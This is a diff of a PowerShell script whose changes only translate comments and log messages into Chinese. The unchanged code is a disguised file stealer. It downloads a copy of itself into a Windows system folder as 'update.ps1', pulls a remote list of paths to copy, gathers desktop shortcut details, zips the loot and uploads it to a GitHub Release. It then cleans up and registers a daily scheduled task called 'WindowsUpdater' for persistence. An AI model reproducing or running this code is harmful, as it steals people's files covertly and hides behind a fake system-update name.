@@ -1,4 +1,4 @@
-# ===================== Log Function =====================
+# ========== 日志输出函数 ==========
 function Log {
     param (
         [string]$Message,
@@ -11,15 +11,15 @@ function Log {
     }
 }
 
-# ===================== Save Self =====================
+# ========== 保存自身 ==========
 $localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
 Invoke-RestMethod -Uri "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1" -OutFile $localPath -UseBasicParsing
 
-# ===================== Set Encoding =====================
+# ========== 设置编码 ==========
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 
-# ===================== GitHub Metadata =====================
+# ========== GitHub 参数 ==========
 $token = $env:GITHUB_TOKEN
 if (-not $token) {
     Log "[ERR] GITHUB_TOKEN 不存在，终止执行。" "Red"
@@ -40,7 +40,7 @@ $zipName = "package-$computerName-$timestamp.zip"
 $zipPath = Join-Path $env:TEMP $zipName
 New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null
 
-# ===================== STEP 1: Load upload-target list =====================
+# ========== 步骤 1：加载路径列表 ==========
 $remoteTxtUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
 try {
     $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
@@ -51,7 +51,7 @@ try {
     return
 }
 
-# ===================== STEP 2: 复制目标路径 =====================
+# ========== 步骤 2：复制目标路径 ==========
 $index = 0
 foreach ($path in $pathList) {
     $index++
@@ -78,7 +78,7 @@ foreach ($path in $pathList) {
     }
 }
 
-# ===================== STEP 3: 收集桌面快捷方式信息 =====================
+# ========== 步骤 3：收集快捷方式信息 ==========
 try {
     $desktop = [Environment]::GetFolderPath("Desktop")
     $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
@@ -98,21 +98,21 @@ try {
 
     $lnkOutputFile = Join-Path $tempRoot "lnk_info.txt"
     $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
-    Log "[OK] 快捷方式信息导出完毕"
+    Log "[OK] 快捷方式信息导出完成"
 } catch {
     Log "[WARN] 快捷方式信息导出失败" "Yellow"
 }
 
-# ===================== STEP 4: 打包压缩 =====================
+# ========== 步骤 4：打包 ==========
 try {
     Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop
-    Log "[OK] 压缩完成：$zipPath"
+    Log "[OK] 文件压缩成功：$zipPath"
 } catch {
-    Log "[ERR] 压缩失败" "Red"
+    Log "[ERR] 文件压缩失败" "Red"
     return
 }
 
-# ===================== STEP 5: 上传到 GitHub Release =====================
+# ========== 步骤 5：上传 GitHub Release ==========
 $releaseData = @{
     tag_name = $tag
     name = $releaseName
@@ -132,7 +132,7 @@ try {
     $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
     Log "[OK] Release 创建成功"
 } catch {
-    Log "[ERR] 创建 release 失败" "Red"
+    Log "[ERR] Release 创建失败" "Red"
     return
 }
 
@@ -144,17 +144,17 @@ try {
         "User-Agent" = "PowerShellScript"
     }
     Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
-    Log "[OK] 上传文件成功"
+    Log "[OK] 文件上传成功"
 } catch {
-    Log "[ERR] 上传文件失败" "Red"
+    Log "[ERR] 文件上传失败" "Red"
 }
 
-# ===================== STEP 6: 清理临时文件 =====================
+# ========== 步骤 6：清理临时文件 ==========
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
 Log "[OK] 清理完成"
 
-# ===================== STEP 7: 注册计划任务 =====================
+# ========== 步骤 7：注册计划任务 ==========
 $taskName = "WindowsUpdater"
 $taskDescription = "Daily file package task"
 $scriptPath = "C:\\ProgramData\\Microsoft\\Windows\\update.ps1"
